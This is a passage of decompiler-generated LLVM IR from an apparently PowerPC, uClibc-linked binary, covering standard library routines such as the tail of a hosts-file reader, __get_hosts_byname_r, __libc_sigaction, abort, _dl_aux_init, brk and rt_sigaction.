  store i32 %v1_100120f4, i32* %v4_1001210c, align 4
  br label %dec_label_pc_10012110

dec_label_pc_10012110:                            ; preds = %dec_label_pc_100120cc, %dec_label_pc_100120f0
  %v0_10012110 = load i32, i32* @r31, align 4
  %v1_10012110 = load i32, i32* @r27, align 4
  %v2_10012110 = icmp slt i32 %v0_10012110, %v1_10012110
  %v1_10012114 = mul i32 %v0_10012110, 4
  %v0_10012118 = load i32, i32* @r1, align 4
  %v2_10012118 = add i32 %v0_10012118, %v1_10012114
  br i1 %v2_10012110, label %dec_label_pc_10012128, label %dec_label_pc_10012134

dec_label_pc_10012128:                            ; preds = %dec_label_pc_10012110
  %v3_10012128 = load i32, i32* @global_var_1002b964.753, align 4
  %tmp35 = icmp slt i32 %v3_10012128, 3
  br i1 %tmp35, label %dec_label_pc_100120f0, label %dec_label_pc_10012134

dec_label_pc_10012134:                            ; preds = %dec_label_pc_10012128, %dec_label_pc_10012110, %dec_label_pc_100120cc
  %v0_10012138 = load i32, i32* @r30, align 4
  store i32 %v0_10012138, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a504.821 to i32), i32* @r4, align 4
  %v3_10012140 = inttoptr i32 %v0_10012138 to i8*
  %v4_10012140 = call i32 @__GI_strcoll(i8* %v3_10012140, i32 ptrtoint ([7 x i8]* @global_var_1001a504.821 to i32))
  store i32 %v4_10012140, i32* %r3.global-to-local, align 4
  %v3_10012144 = icmp eq i32 %v4_10012140, 0
  br i1 %v3_10012144, label %dec_label_pc_10012184.preheader, label %dec_label_pc_1001214c

dec_label_pc_1001214c:                            ; preds = %dec_label_pc_10012134
  %v0_10012150 = load i32, i32* @r30, align 4
  store i32 %v0_10012150, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1001a50c.822 to i32), i32* @r4, align 4
  %v3_10012158 = inttoptr i32 %v0_10012150 to i8*
  %v4_10012158 = call i32 @__GI_strcoll(i8* %v3_10012158, i32 ptrtoint ([7 x i8]* @global_var_1001a50c.822 to i32))
  store i32 %v4_10012158, i32* %r3.global-to-local, align 4
  %v3_1001215c = icmp eq i32 %v4_10012158, 0
  br i1 %v3_1001215c, label %dec_label_pc_10012184.preheader, label %dec_label_pc_100121f0.backedge

dec_label_pc_10012184.preheader:                  ; preds = %dec_label_pc_10012134, %dec_label_pc_1001214c
  store i32 ptrtoint (i32* @global_var_10031c50.809 to i32), i32* @r31, align 4
  %v3_1001219041 = load i32, i32* @global_var_1002b968.807, align 4
  %v2_1001219443 = icmp sgt i32 %v3_1001219041, 0
  %v1_1001219845 = add i32 %v3_1001219041, -1
  %v1_1001219c46 = mul i32 %v1_1001219845, 4
  store i32 %v1_1001219c46, i32* %r11.global-to-local, align 4
  br i1 %v2_1001219443, label %dec_label_pc_10012168, label %dec_label_pc_100121a4

dec_label_pc_10012168:                            ; preds = %dec_label_pc_10012184.preheader, %dec_label_pc_10012168
  %v1_1001219c48 = phi i32 [ %v1_1001219c, %dec_label_pc_10012168 ], [ %v1_1001219c46, %dec_label_pc_10012184.preheader ]
  %v1_1001219847 = phi i32 [ %v1_10012198, %dec_label_pc_10012168 ], [ %v1_1001219845, %dec_label_pc_10012184.preheader ]
  %v2_10012168 = add i32 %v1_1001219c48, ptrtoint (i32* @global_var_10031c50.809 to i32)
  %v3_10012168 = inttoptr i32 %v2_10012168 to i32*
  %v4_10012168 = load i32, i32* %v3_10012168, align 4
  store i32 %v4_10012168, i32* %r3.global-to-local, align 4
  store i32 %v1_1001219847, i32* @global_var_1002b968.807, align 4
  store i32 268509556, i32* @lr, align 4
  %v1_10012170 = call i32 @free(i32 %v4_10012168)
  store i32 %v1_10012170, i32* %r3.global-to-local, align 4
  %v3_10012174 = load i32, i32* @global_var_1002b968.807, align 4
  %v1_1001217c = mul i32 %v3_10012174, 4
  %v1_10012180 = load i32, i32* @r31, align 4
  %v3_10012180 = add i32 %v1_10012180, %v1_1001217c
  %v4_10012180 = inttoptr i32 %v3_10012180 to i32*
  store i32 0, i32* %v4_10012180, align 4
  store i32 ptrtoint (i32* @global_var_10031c50.809 to i32), i32* @r31, align 4
  %v3_10012190 = load i32, i32* @global_var_1002b968.807, align 4
  %v2_10012194 = icmp sgt i32 %v3_10012190, 0
  %v1_10012198 = add i32 %v3_10012190, -1
  %v1_1001219c = mul i32 %v1_10012198, 4
  store i32 %v1_1001219c, i32* %r11.global-to-local, align 4
  br i1 %v2_10012194, label %dec_label_pc_10012168, label %dec_label_pc_100121a4

dec_label_pc_100121a4:                            ; preds = %dec_label_pc_10012168, %dec_label_pc_10012184.preheader
  %v3_100121e459 = phi i32 [ %v3_1001219041, %dec_label_pc_10012184.preheader ], [ %v3_10012190, %dec_label_pc_10012168 ]
  %v1_100121cc49 = load i32, i32* @r27, align 4
  %v2_100121cc50 = icmp sgt i32 %v1_100121cc49, 1
  %v0_100121d453 = load i32, i32* @r1, align 4
  %v2_100121d454 = add i32 %v0_100121d453, 4
  br i1 %v2_100121cc50, label %dec_label_pc_100121e4, label %dec_label_pc_100121f0.backedge

dec_label_pc_100121ac:                            ; preds = %dec_label_pc_100121e4
  %v1_100121ac = add i32 %v2_100121d455, 24
  %v2_100121ac = inttoptr i32 %v1_100121ac to i32*
  %v3_100121ac = load i32, i32* %v2_100121ac, align 4
  store i32 %v3_100121ac, i32* %r3.global-to-local, align 4
  store i32 268509620, i32* @lr, align 4
  %v1_100121b0 = call i32 @__GI_strdup(i32 %v3_100121ac)
  store i32 %v1_100121b0, i32* %r3.global-to-local, align 4
  %v0_100121b8 = load i32, i32* @r29, align 4
  %v1_100121b8 = add i32 %v0_100121b8, 1
  store i32 %v1_100121b8, i32* %r11.global-to-local, align 4
  %v1_100121bc = mul i32 %v0_100121b8, 4
  store i32 %v1_100121b8, i32* @global_var_1002b968.807, align 4
  %v3_100121c8 = add i32 %v1_100121bc, ptrtoint (i32* @global_var_10031c50.809 to i32)
  %v4_100121c8 = inttoptr i32 %v3_100121c8 to i32*
  store i32 %v1_100121b0, i32* %v4_100121c8, align 4
  %v0_100121cc.pre = load i32, i32* @r31, align 4
  %v1_100121cc = load i32, i32* @r27, align 4
  %v2_100121cc = icmp slt i32 %v0_100121cc.pre, %v1_100121cc
  br i1 %v2_100121cc, label %dec_label_pc_100121ac.dec_label_pc_100121e4_crit_edge, label %dec_label_pc_100121f0.backedge

dec_label_pc_100121ac.dec_label_pc_100121e4_crit_edge: ; preds = %dec_label_pc_100121ac
  %v0_100121d4 = load i32, i32* @r1, align 4
  %v1_100121d0 = mul i32 %v0_100121cc.pre, 4
  %v2_100121d4 = add i32 %v0_100121d4, %v1_100121d0
  %v3_100121e4.pre = load i32, i32* @global_var_1002b968.807, align 4
  br label %dec_label_pc_100121e4

dec_label_pc_100121e4:                            ; preds = %dec_label_pc_100121a4, %dec_label_pc_100121ac.dec_label_pc_100121e4_crit_edge
  %v3_100121e4 = phi i32 [ %v3_100121e4.pre, %dec_label_pc_100121ac.dec_label_pc_100121e4_crit_edge ], [ %v3_100121e459, %dec_label_pc_100121a4 ]
  %v2_100121d455 = phi i32 [ %v2_100121d4, %dec_label_pc_100121ac.dec_label_pc_100121e4_crit_edge ], [ %v2_100121d454, %dec_label_pc_100121a4 ]
  %tmp37 = icmp slt i32 %v3_100121e4, 4
  br i1 %tmp37, label %dec_label_pc_100121ac, label %dec_label_pc_100121f0.backedge

dec_label_pc_100121f0:                            ; preds = %dec_label_pc_100121f0.backedge, %dec_label_pc_100121f0.preheader
  %v0_100121fc = phi i32 [ %v0_100121fc.pre, %dec_label_pc_100121f0.backedge ], [ %v0_100121fc16, %dec_label_pc_100121f0.preheader ]
  store i32 %v2_100121f0, i32* %r3.global-to-local, align 4
  store i32 268509700, i32* @lr, align 4
  %v3_10012200 = call i32 @fgets(i32 %v2_100121f0, i32 128, i32 %v0_100121fc)
  store i32 %v3_10012200, i32* %r3.global-to-local, align 4
  %v3_10012204 = icmp eq i32 %v3_10012200, 0
  br i1 %v3_10012204, label %dec_label_pc_10012214, label %dec_label_pc_10011ffc.preheader

dec_label_pc_10011ffc.preheader:                  ; preds = %dec_label_pc_100121f0
  store i32 %v2_100121f0, i32* %r3.global-to-local, align 4
  %v2_10011ffc3 = load i8, i8* %v1_10011ffc2, align 4
  %v3_10011ffc4 = zext i8 %v2_10011ffc3 to i32
  store i32 %v3_10011ffc4, i32* %r11.global-to-local, align 4
  %v3_100120046 = icmp eq i8 %v2_10011ffc3, 0
  br i1 %v3_100120046, label %dec_label_pc_100121f0.backedge, label %dec_label_pc_10012010.lr.ph

dec_label_pc_10012010.lr.ph:                      ; preds = %dec_label_pc_10011ffc.preheader
  %v3_10012010.pre = load i32, i32* @global_var_1002b8c0, align 4
  br label %dec_label_pc_10012010

dec_label_pc_10012214:                            ; preds = %dec_label_pc_100121f0
  %v0_10012214 = load i32, i32* @r26, align 4
  store i32 %v0_10012214, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001221c.823 to i32), i32* @lr, align 4
  %v1_10012218 = inttoptr i32 %v0_10012214 to i16*
  %v2_10012218 = call i32 @__GI_fclose(i16* %v1_10012218)
  store i32 %v2_10012218, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001222c

dec_label_pc_10012220:                            ; preds = %dec_label_pc_10011fdc
  %v0_10012220 = call i32 @__GI___h_errno_location()
  store i32 %v0_10012220, i32* %r3.global-to-local, align 4
  %v2_10012228 = inttoptr i32 %v0_10012220 to i32*
  store i32 3, i32* %v2_10012228, align 4
  br label %dec_label_pc_1001222c

dec_label_pc_1001222c:                            ; preds = %entry, %dec_label_pc_10012214, %dec_label_pc_10012220
  store i32 %v2_10011f98, i32* @r3, align 4
  %v0_10012234 = call i32 @__pthread_return_void()
  store i32 %v0_10012234, i32* %r3.global-to-local, align 4
  ret i32 %v0_10012234

; uselistorder directives
  uselistorder i32 %v3_10011ffc4, { 2, 0, 1 }
  uselistorder i32 %v1_1001219c46, { 1, 0 }
  uselistorder i32 %v1_1001219845, { 1, 0 }
  uselistorder i32 %v0_10012044, { 1, 0 }
  uselistorder i32 %v1_10012094, { 1, 0 }
  uselistorder i8* %v1_1001208c, { 0, 2, 1 }
  uselistorder i8 %v2_1001205c, { 2, 0, 1 }
  uselistorder i32 %v0_10012058, { 0, 1, 3, 2 }
  uselistorder i32 %v3_10011ffc, { 1, 0, 2 }
  uselistorder i32 %v1_10011ff8, { 0, 2, 1 }
  uselistorder i32 %v2_100121f0, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10011f98, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 17, 18, 19, 2, 1, 26, 13, 20, 3, 21, 4, 22, 5, 23, 6, 24, 7, 25, 8, 9, 11, 12, 10, 0, 27, 14, 28, 15, 29, 16 }
  uselistorder i32* %r11.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1, 6 }
  uselistorder i32* @global_var_1002b968.807, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10031c50.809 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10031c60.754 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002b870.751 to i32), { 0, 2, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_1001222c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100121e4, { 1, 0 }
  uselistorder label %dec_label_pc_10012168, { 1, 0 }
  uselistorder label %dec_label_pc_10012184.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10012110, { 1, 0 }
  uselistorder label %dec_label_pc_100120cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100120c4, { 1, 0 }
  uselistorder label %dec_label_pc_1001208c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001205c, { 1, 0 }
  uselistorder label %dec_label_pc_100121f0.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_100121f0.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_10012250 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268509840, i32* @lr, align 4
  %v9_1001228c = inttoptr i32 %arg3 to i32*
  %v10_1001228c = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_1001228c, i32 %arg4, i32 %arg5, i32 %v4_10012250, i32 %arg7)
  ret i32 %v10_1001228c
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_100122a8 = load i32, i32* @lr, align 4
  store i32 %v0_100122a8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_100122b4 = icmp eq i32* %arg2, null
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_100122c4 = add i32 %tmp, 4
  store i32 %v1_100122c4, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  %v2_100122cc = ptrtoint i32* %stack_var_-300 to i32
  store i32 %v2_100122cc, i32* @r3, align 4
  br i1 %v3_100122b4, label %dec_label_pc_100122f4, label %dec_label_pc_100122d4

dec_label_pc_100122d4:                            ; preds = %entry
  %v2_100122d4 = load i32, i32* %arg2, align 4
  store i32 %v2_100122d4, i32* %r0.global-to-local, align 4
  store i32 268509920, i32* @lr, align 4
  %v0_100122dc = call i32 @memcpy()
  %v0_100122e0 = load i32, i32* @r31, align 4
  %v1_100122e0 = add i32 %v0_100122e0, 132
  %v2_100122e0 = inttoptr i32 %v1_100122e0 to i32*
  %v3_100122e0 = load i32, i32* %v2_100122e0, align 4
  store i32 %v3_100122e0, i32* %r0.global-to-local, align 4
  %v1_100122ec = add i32 %v0_100122e0, 136
  %v2_100122ec = inttoptr i32 %v1_100122ec to i32*
  %v3_100122ec = load i32, i32* %v2_100122ec, align 4
  store i32 %v3_100122ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_100122f4

dec_label_pc_100122f4:                            ; preds = %entry, %dec_label_pc_100122d4
  store i32 268509972, i32* @lr, align 4
  %v0_10012310 = call i32 @__syscall_rt_sigaction()
  %v0_10012314 = load i32, i32* %r30.global-to-local, align 4
  %v3_10012314 = icmp eq i32 %v0_10012314, 0
  store i32 %v0_10012310, i32* @r31, align 4
  br i1 %v3_10012314, label %dec_label_pc_10012350, label %dec_label_pc_10012324

dec_label_pc_10012324:                            ; preds = %dec_label_pc_100122f4
  %v1_1001231c = icmp slt i32 %v0_10012310, 0
  %v1_10012324 = add i32 %v0_10012314, 4
  store i32 %v1_10012324, i32* @r3, align 4
  %v2_10012328 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v2_10012328, i32* @r4, align 4
  store i32 128, i32* @r5, align 4
  br i1 %v1_1001231c, label %dec_label_pc_10012350, label %dec_label_pc_10012334

dec_label_pc_10012334:                            ; preds = %dec_label_pc_10012324
  %v3_10012334 = load i32, i32* %stack_var_-172, align 4
  store i32 %v3_10012334, i32* %r0.global-to-local, align 4
  %v2_10012338 = inttoptr i32 %v0_10012314 to i32*
  store i32 %v3_10012334, i32* %v2_10012338, align 4
  store i32 268510016, i32* @lr, align 4
  %v0_1001233c = call i32 @memcpy()
  %v1_10012348 = load i32, i32* %r30.global-to-local, align 4
  %v2_10012348 = add i32 %v1_10012348, 136
  %v3_10012348 = inttoptr i32 %v2_10012348 to i32*
  %v0_1001234c = load i32, i32* %r0.global-to-local, align 4
  %v1_1001234c = load i32, i32* %r30.global-to-local, align 4
  %v2_1001234c = add i32 %v1_1001234c, 132
  %v3_1001234c = inttoptr i32 %v2_1001234c to i32*
  store i32 %v0_1001234c, i32* %v3_1001234c, align 4
  %v0_10012354.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10012350

dec_label_pc_10012350:                            ; preds = %dec_label_pc_10012324, %dec_label_pc_100122f4, %dec_label_pc_10012334
  %v0_10012354 = phi i32 [ %v0_10012310, %dec_label_pc_10012324 ], [ %v0_10012310, %dec_label_pc_100122f4 ], [ %v0_10012354.pre, %dec_label_pc_10012334 ]
  store i32 %v0_100122a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_10012354

; uselistorder directives
  uselistorder i32 %v0_10012310, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_10012350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100122f4, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_1001239c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_10012380 = call i32 @__pthread_return_0()
  %v2_10012388 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10012388, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_100123a033 = add i32 %v2_10012388, 124
  %v4_100123a034 = inttoptr i32 %v3_100123a033 to i32*
  store i32 0, i32* %v4_100123a034, align 4
  %v0_100123a435 = load i32, i32* %r9.global-to-local, align 4
  %v1_100123a436 = add i32 %v0_100123a435, -1
  store i32 %v1_100123a436, i32* %r9.global-to-local, align 4
  %v0_100123a837 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100123a838 = add i32 %v0_100123a837, -1
  store i32 %v1_100123a838, i32* %ctr.global-to-local, align 4
  %v2_100123a839 = icmp eq i32 %v1_100123a838, 0
  br i1 %v2_100123a839, label %dec_label_pc_100123ac, label %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge

dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge: ; preds = %dec_label_pc_1001239c.lr.ph, %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge
  %v1_100123a440 = phi i32 [ %v1_100123a4, %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge ], [ %v1_100123a436, %dec_label_pc_1001239c.lr.ph ]
  %v0_100123a0.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_100123a0.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_1001239c = mul i32 %v1_100123a440, 4
  %v3_100123a0 = add i32 %v1_1001239c, %v1_100123a0.pre
  %v4_100123a0 = inttoptr i32 %v3_100123a0 to i32*
  store i32 %v0_100123a0.pre, i32* %v4_100123a0, align 4
  %v0_100123a4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100123a4 = add i32 %v0_100123a4, -1
  store i32 %v1_100123a4, i32* %r9.global-to-local, align 4
  %v0_100123a8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100123a8 = add i32 %v0_100123a8, -1
  store i32 %v1_100123a8, i32* %ctr.global-to-local, align 4
  %v2_100123a8 = icmp eq i32 %v1_100123a8, 0
  br i1 %v2_100123a8, label %dec_label_pc_100123ac, label %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge

dec_label_pc_100123ac:                            ; preds = %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge, %dec_label_pc_1001239c.lr.ph
  store i32 %v2_10012388, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_100123b4 = call i32 @__sigaddset()
  %v3_100123b8 = icmp eq i32 %v0_100123b4, 0
  br i1 %v3_100123b8, label %dec_label_pc_100123c0, label %dec_label_pc_100123d0

dec_label_pc_100123c0:                            ; preds = %dec_label_pc_100123ac
  store i32 268510160, i32* @lr, align 4
  %v3_100123cc = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10012388, i32 0)
  br label %dec_label_pc_100123d0

dec_label_pc_100123d0:                            ; preds = %dec_label_pc_100123ac, %dec_label_pc_100123c0
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_100123d4 = load i32, i32* @global_var_1002b96c.827, align 4
  %v3_100123d8 = icmp eq i32 %v3_100123d4, 0
  br i1 %v3_100123d8, label %dec_label_pc_100123e0, label %dec_label_pc_10012408

dec_label_pc_100123e0:                            ; preds = %dec_label_pc_100123d0
  store i32 1, i32* @global_var_1002b96c.827, align 4
  br label %dec_label_pc_100123e8

dec_label_pc_100123e8:                            ; preds = %dec_label_pc_10012464, %dec_label_pc_100123e0
  store i32 ptrtoint (i32* @global_var_1002b888.825 to i32), i32* %r29.global-to-local, align 4
  %v0_100123f4 = call i32 @__pthread_return_0()
  store i32 268510208, i32* @lr, align 4
  %v1_100123fc = call i32 @__raise(i32 6)
  %v0_10012404 = call i32 @__pthread_return_0()
  %v3_1001240c.pre = load i32, i32* @global_var_1002b96c.827, align 4
  br label %dec_label_pc_10012408

dec_label_pc_10012408:                            ; preds = %dec_label_pc_100123d0, %dec_label_pc_100123e8
  %v0_10012480 = phi i32 [ %v3_100123d4, %dec_label_pc_100123d0 ], [ %v3_1001240c.pre, %dec_label_pc_100123e8 ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10012410 = icmp eq i32 %v0_10012480, 1
  br i1 %v3_10012410, label %dec_label_pc_10012450.lr.ph, label %dec_label_pc_10012480

dec_label_pc_10012450.lr.ph:                      ; preds = %dec_label_pc_10012408
  %v2_1001241c = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002b96c.827, align 4
  store i32 ptrtoint (i32* @global_var_10012430.829 to i32), i32* @lr, align 4
  %v3_1001242c = call i32 @__GI_memset(i32 %v2_1001241c, i32 0, i32 140)
  store i32 %v2_10012388, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_100123a033, i32* %r9.global-to-local, align 4
  %v2_1001245825 = add i32 %v2_10012388, 256
  %v3_1001245826 = inttoptr i32 %v2_1001245825 to i32*
  store i32 -1, i32* %v3_1001245826, align 4
  %v0_1001245c27 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001245c28 = add i32 %v0_1001245c27, -1
  store i32 %v1_1001245c28, i32* %r11.global-to-local, align 4
  %v0_1001246029 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001246030 = add i32 %v0_1001246029, -1
  store i32 %v1_1001246030, i32* %ctr.global-to-local, align 4
  %v2_1001246031 = icmp eq i32 %v1_1001246030, 0
  br i1 %v2_1001246031, label %dec_label_pc_10012464, label %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge

dec_label_pc_10012450.dec_label_pc_10012450_crit_edge: ; preds = %dec_label_pc_10012450.lr.ph, %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge
  %v1_1001245c32 = phi i32 [ %v1_1001245c, %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge ], [ %v1_1001245c28, %dec_label_pc_10012450.lr.ph ]
  %v1_10012454.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10012458.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10012450 = mul i32 %v1_1001245c32, 4
  %v2_10012454 = add i32 %v1_10012450, %v1_10012454.pre
  store i32 %v2_10012454, i32* %r9.global-to-local, align 4
  %v2_10012458 = add i32 %v2_10012454, 132
  %v3_10012458 = inttoptr i32 %v2_10012458 to i32*
  store i32 %v0_10012458.pre, i32* %v3_10012458, align 4
  %v0_1001245c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001245c = add i32 %v0_1001245c, -1
  store i32 %v1_1001245c, i32* %r11.global-to-local, align 4
  %v0_10012460 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10012460 = add i32 %v0_10012460, -1
  store i32 %v1_10012460, i32* %ctr.global-to-local, align 4
  %v2_10012460 = icmp eq i32 %v1_10012460, 0
  br i1 %v2_10012460, label %dec_label_pc_10012464, label %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge

dec_label_pc_10012464:                            ; preds = %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge, %dec_label_pc_10012450.lr.ph
  store i32 268510332, i32* @lr, align 4
  %v4_10012478 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_100123e8

dec_label_pc_10012480:                            ; preds = %dec_label_pc_10012408
  %v3_10012480 = icmp eq i32 %v0_10012480, 2
  br i1 %v3_10012480, label %dec_label_pc_10012488, label %dec_label_pc_10012494

dec_label_pc_10012488:                            ; preds = %dec_label_pc_10012480
  store i32 3, i32* @global_var_1002b96c.827, align 4
  br label %dec_label_pc_10012494

dec_label_pc_10012494:                            ; preds = %dec_label_pc_10012480, %dec_label_pc_10012488
  %v3_10012494 = phi i32 [ %v0_10012480, %dec_label_pc_10012480 ], [ 3, %dec_label_pc_10012488 ]
  %v1_1001249c = icmp ne i32 %v3_10012494, 3
  call void @__pseudo_cond_branch(i1 %v1_1001249c, i32 268510384)
  store i32 4, i32* @global_var_1002b96c.827, align 4
  %v1_100124ac = call i32 @__GI__exit(i32 127)
  ret i32 %v1_100124ac

; uselistorder directives
  uselistorder i32 %v1_10012460, { 1, 0 }
  uselistorder i32 %v1_1001245c, { 1, 0 }
  uselistorder i32 %v1_100123a8, { 1, 0 }
  uselistorder i32 %v1_100123a4, { 1, 0 }
  uselistorder i32 %v2_10012388, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 3, 12, 11, 10, 9, 8, 7, 6, 5, 4, 2 }
  uselistorder i32 127, { 1, 6, 0, 2, 4, 7, 5, 3 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_1002b96c.827, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder i32 124, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10012494, { 1, 0 }
  uselistorder label %dec_label_pc_10012450.dec_label_pc_10012450_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10012408, { 1, 0 }
  uselistorder label %dec_label_pc_100123d0, { 1, 0 }
  uselistorder label %dec_label_pc_1001239c.dec_label_pc_1001239c_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_100124b8 = add i32 %arg1, 28
  %v2_100124b8 = inttoptr i32 %v1_100124b8 to i32*
  %v3_100124b8 = load i32, i32* %v2_100124b8, align 4
  store i32 %v3_100124b8, i32* @global_var_1002b970.830, align 4
  %v1_100124c8 = add i32 %arg1, 44
  %v2_100124c8 = inttoptr i32 %v1_100124c8 to i32*
  %v3_100124c8 = load i32, i32* %v2_100124c8, align 4
  store i32 %v3_100124c8, i32* @global_var_1002b974.831, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002b978.794, align 4
  %v0_100124fc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_100124fc)
  store i32 12, i32* @r3, align 4
  %v0_10012504 = call i32 @__syscall_error()
  ret i32 %v0_10012504

; uselistorder directives
  uselistorder i32* @global_var_1002b978.794, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10012520 = call i32 @__asm_mfcr()
  %v1_10012524 = and i32 %v0_10012520, 268435456
  %v3_10012524 = icmp eq i32 %v1_10012524, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10012520, i32* %r31.global-to-local, align 4
  br i1 %v3_10012524, label %dec_label_pc_1001253c, label %dec_label_pc_10012530

dec_label_pc_10012530:                            ; preds = %entry
  %v0_10012530 = call i32 @__errno_location()
  %v0_10012534 = load i32, i32* %r31.global-to-local, align 4
  %v2_10012534 = inttoptr i32 %v0_10012530 to i32*
  store i32 %v0_10012534, i32* %v2_10012534, align 4
  br label %dec_label_pc_1001253c

dec_label_pc_1001253c:                            ; preds = %entry, %dec_label_pc_10012530
  %v0_1001254c = phi i32 [ %v0_10012520, %entry ], [ -1, %dec_label_pc_10012530 ]
  ret i32 %v0_1001254c

; uselistorder directives
